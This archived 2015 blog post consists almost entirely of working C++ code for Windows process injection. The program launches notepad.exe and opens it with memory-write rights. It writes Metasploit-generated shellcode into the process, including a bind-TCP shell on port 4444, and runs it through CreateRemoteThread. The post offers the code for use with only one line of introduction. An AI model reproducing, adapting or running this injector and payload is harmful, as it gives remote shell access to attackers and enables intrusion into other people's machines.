---
title: 'Process Injection technique c++'
date: 2015-02-01T11:14:00.001Z
draft: false
aliases: [ "/2015/02/process-injection-technique-c.html" ]
parent: Blogger
---
#### date: 2015-02-01

I thought it would be better to post some working code for speed ;p

```
//  
//  
// Code Injection Example  
//  
// Coded by: atom0s  
// Coded on: Oct. 08, 2009  
//  
//>  ref;  
//> https://forum.tuts4you.com/topic/21391-injecting-code-into-a-process/  
//> -- used to only works if the process is being debugged by ollyDB on windows 7 as normal user, this was because  
//> it ran under 32bit, only windows syswow64 path had 32bit, which is backwards logic,   
//> you'd think system32 would be 32bit, oh no it's not!!  
//> also read http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html   
  
// for shellcoding see http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html  
  
#include <windows.h>  
#include <tchar.h>  
#include <stdio.h>  
  
#include <tlhelp32.h>  
  
//> to be replaced at some point with proper detection of OS & Arch.  
int codepath = 1; //> lets me try new things :)  
int payLoadPath = 5;  
/\* payload paths  
1 = original example now all commented out, with extra strings and hello world messagebox. working example using btFunction\[\]  
2 = scMessagebox2\[\] test at pure bytecode injecting ref http://noobys-journey.blogspot.co.uk/2010/11/injecting-shellcode-into-xpvista7.html  
3 = char scSpeakPwned\[\] generated from metasploit.  
4 = scBindTcp4444\[\] generated from metasploit.  
for generating shellcode using metasploit don't see http://projectshellcode.com/?q=node/29 it's a bit light!  
\*/  
  
  
  
// ref http://www.exploit-db.com/exploits/28996/   closes notepad after closing message.  
char scMessagebox2\[\] =   
"\\x31\\xd2\\xb2\\x30\\x64\\x8b\\x12\\x8b\\x52\\x0c\\x8b\\x52\\x1c\\x8b\\x42"  
"\\x08\\x8b\\x72\\x20\\x8b\\x12\\x80\\x7e\\x0c\\x33\\x75\\xf2\\x89\\xc7\\x03"  
"\\x78\\x3c\\x8b\\x57\\x78\\x01\\xc2\\x8b\\x7a\\x20\\x01\\xc7\\x31\\xed\\x8b"  
"\\x34\\xaf\\x01\\xc6\\x45\\x81\\x3e\\x46\\x61\\x74\\x61\\x75\\xf2\\x81\\x7e"  
"\\x08\\x45\\x78\\x69\\x74\\x75\\xe9\\x8b\\x7a\\x24\\x01\\xc7\\x66\\x8b\\x2c"  
"\\x6f\\x8b\\x7a\\x1c\\x01\\xc7\\x8b\\x7c\\xaf\\xfc\\x01\\xc7\\x68\\x79\\x74"  
"\\x65\\x01\\x68\\x6b\\x65\\x6e\\x42\\x68\\x20\\x42\\x72\\x6f\\x89\\xe1\\xfe"  
"\\x49\\x0b\\x31\\xc0\\x51\\x50\\xff\\xd7";  
  
// # windows / speak\_pwned - 247 bytes  
// # http://www.metasploit.com  
// # VERBOSE = false, PrependMigrate = false  
char scSpeakPwned\[\] =  
"\\x66\\x81\\xe4\\xfc\\xff\\x31\\xf6\\x64\\x8b\\x76\\x30\\x8b\\x76\\x0c"  
"\\x8b\\x76\\x1c\\x56\\x66\\xbe\\xaa\\x1a\\x5f\\x8b\\x6f\\x08\\xff\\x37"  
"\\x8b\\x5d\\x3c\\x8b\\x5c\\x1d\\x78\\x01\\xeb\\x8b\\x4b\\x18\\x67\\xe3"  
"\\xeb\\x8b\\x7b\\x20\\x01\\xef\\x8b\\x7c\\x8f\\xfc\\x01\\xef\\x31\\xc0"  
"\\x99\\x32\\x17\\x66\\xc1\\xca\\x01\\xae\\x75\\xf7\\x49\\x66\\x39\\xf2"  
"\\x74\\x08\\x67\\xe3\\xcb\\xe9\\xdb\\xff\\xff\\xff\\x8b\\x73\\x24\\x01"  
"\\xee\\x0f\\xb7\\x34\\x4e\\x8b\\x43\\x1c\\x01\\xe8\\x8b\\x3c\\xb0\\x01"  
"\\xef\\x31\\xf6\\x66\\x81\\xfa\\xda\\xf0\\x74\\x1b\\x66\\x81\\xfa\\x69"  
"\\x27\\x74\\x20\\x6a\\x32\\x68\\x6f\\x6c\\x65\\x33\\x54\\xff\\xd7\\x95"  
"\\x66\\xbe\\xda\\xf0\\xe9\\x95\\xff\\xff\\xff\\x56\\xff\\xd7\\x66\\xbe"  
"\\x69\\x27\\xe9\\x89\\xff\\xff\\xff\\x68\\x6e\\x04\\x22\\xd4\\x68\\xa1"  
"\\xec\\xef\\x99\\x68\\xb9\\x72\\x92\\x49\\x68\\x74\\xdf\\x44\\x6c\\x89"  
"\\xe0\\x68\\x4f\\x79\\x73\\x96\\x68\\x9e\\xe3\\x01\\xc0\\xff\\x4c\\x24"  
"\\x02\\x68\\x91\\x33\\xd2\\x11\\x68\\x77\\x93\\x74\\x96\\x89\\xe3\\x56"  
"\\x54\\x50\\x6a\\x17\\x56\\x53\\xff\\xd7\\x5b\\x68\\x6f\\x67\\x20\\x55"  
"\\x68\\x6f\\x70\\x20\\x74\\x68\\x21\\x64\\x6e\\x68\\x96\\x89\\xe6\\x50"  
"\\xac\\x66\\x50\\x3c\\x55\\x75\\xf9\\x89\\xe1\\x31\\xc0\\x50\\x50\\x51"  
"\\x53\\x8b\\x13\\x8b\\x4a\\x50\\xff\\xd1\\xcc";  
  
// 4 - # windows / shell\_bind\_tcp - 341 bytes  
// # http://www.metasploit.com  
// # VERBOSE = false, LPORT = 4444, RHOST = , PrependMigrate = false,  
// # EXITFUNC = process, InitialAutoRunScript = , AutoRunScript =  
char scBindTcp4444\[\] =  
"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52"  
"\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26"  
"\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d"  
"\\x01\\xc7\\xe2\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0"  
"\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b"  
"\\x58\\x20\\x01\\xd3\\xe3\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff"  
"\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d"  
"\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b"  
"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44"  
"\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b"  
"\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f"  
"\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29"  
"\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50"  
"\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x89\\xc7\\x31"  
"\\xdb\\x53\\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68"  
"\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x53\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff"  
"\\xd5\\x53\\x53\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x89\\xc7"  
"\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3"  
"\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44"  
"\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56"  
"\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86"  
"\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\\x68\\x08\\x87\\x1d\\x60"  
"\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5"  
"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f"  
"\\x6a\\x00\\x53\\xff\\xd5";  
  
  
  
bool InjectCode(DWORD dwProcId)  
{  
 /\*  
 \* Our various needed strings for our messagebox  
 \* function to properly work.  
 //> (we create our strings etc here, so can can measure the size later when we move them into blocks of memory)  
 \*/  
  
  //char\* szModule = "user32.dll";  
  //char\* szFunction = "MessageBoxA";  
  //char\* szMessage = "Hello world1!";  
  //char\* szCaption = "Hello1!";  
   
 /\*  
 \* Open our process with proper access so we can  
 \* do various memory operations and such.  
 \*/  
 //> Step 1  
  
 HANDLE hHandle;  
  
 if (codepath == 1)  
 {  
  hHandle = OpenProcess(PROCESS\_QUERY\_INFORMATION | PROCESS\_VM\_OPERATION | PROCESS\_VM\_READ | PROCESS\_VM\_WRITE | PROCESS\_CREATE\_THREAD, 0, dwProcId);  
 }  
 //if (codepath == 3)  
 //{  
 // hHandle = OpenProcess(PROCESS\_ALL\_ACCESS, 0, dwProcId);  
 //}  
  
  
 if (hHandle == INVALID\_HANDLE\_VALUE)  
  return false;  
  
 /\*  
 \* Allocate memory for our strings and function,  
 \* each string has it's own memory block.  
 //> (we are directly creating blocks of memory which can later be referenced and copied into a running process)  
 \*/  
 //> Step 2  
 LPVOID lpShellCode;  
   
  
 if (payLoadPath == 4)  
 {  
  //> allocating memory  
  lpShellCode = VirtualAllocEx(hHandle, 0, sizeof(scBindTcp4444), MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);  
  
  //> check allocation successful  
  if (lpShellCode == NULL){  
   CloseHandle(hHandle);  
   return false;  
  }  
  
  //> write shellcode into allocated memory  
  WriteProcessMemory(hHandle, lpShellCode, scBindTcp4444, sizeof(scBindTcp4444), 0);  
 }  
 else  
 {  
  //> allocating memory  
  lpShellCode = VirtualAllocEx(hHandle, 0, sizeof(scBindTcp4444), MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);  
  
  //> check allocation successful  
  if (lpShellCode == NULL){  
   CloseHandle(hHandle);  
   return false;  
  }  
  
  //> write shellcode into allocated memory  
  WriteProcessMemory(hHandle, lpShellCode, scBindTcp4444, sizeof(scBindTcp4444), 0);  
 }  
  
#pragma region codepath1   
 //> fails here if run as user without ollydb, could use NtCreateThreadEx()  
 /\*> looks like it could be down to 'Session Separation' introduced in vista  
  Actually think it because i crossed 32bit 64bit boundary  
  ollydb runs in 32bit  
  
  Confirmed due to 32/64bit boundary, need to open c:\\Windows\\SysWOW64\\notepad.exe for 32bit app,  
  it's back to front logic :(  
  \*/  
 //> Step 4  
   
 if (codepath == 1)  
 {  
  /\*  
  \* Create a thread and call the function.  
  \*/  
  
  HANDLE hThread = CreateRemoteThread(  
   hHandle,   
   0,   
   0,   
   (LPTHREAD\_START\_ROUTINE)lpShellCode,  
   0,   
   0,   
   0  
   );  
  
  if (hThread == NULL) {  
   CloseHandle(hHandle);  
   return false;  
  }  
  
  return true;  
 }  
  
#pragma endregion  
  
  
}  
  
  
int \_\_cdecl main(int argc, TCHAR\* argv\[\])  
{  
 //> Added option here to start target process.  
 bool startTargetProcess = true;  
 if (startTargetProcess)  
 {  
  STARTUPINFO si = { sizeof(STARTUPINFO) };  
  si.cb = sizeof(si);  
  si.dwFlags = STARTF\_USESHOWWINDOW;  
  si.wShowWindow = SW\_NORMAL;  
  PROCESS\_INFORMATION pi;  
  CreateProcess("c:\\\\Windows\\\\SysWOW64\\\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE\_NEW\_CONSOLE, NULL, NULL, &si, &pi);  
 }  
  
 PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };  
 HANDLE   hSnapshot = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0);  
  
 if (hSnapshot == INVALID\_HANDLE\_VALUE)  
  return 0;  
  
 if (!Process32First(hSnapshot, &pe32)) {  
  CloseHandle(hSnapshot);  
  return 0;  
 }  
  
 do {  
  if (\_tcsicmp(\_T("notepad.exe"), pe32.szExeFile) == 0) {  
  
   CloseHandle(hSnapshot);  
  
   InjectCode(pe32.th32ProcessID);  
     
   return 0;  
  
  }  
 } while (Process32Next(hSnapshot, &pe32));  
  
 CloseHandle(hSnapshot);  
  
 return 0;  
}  

```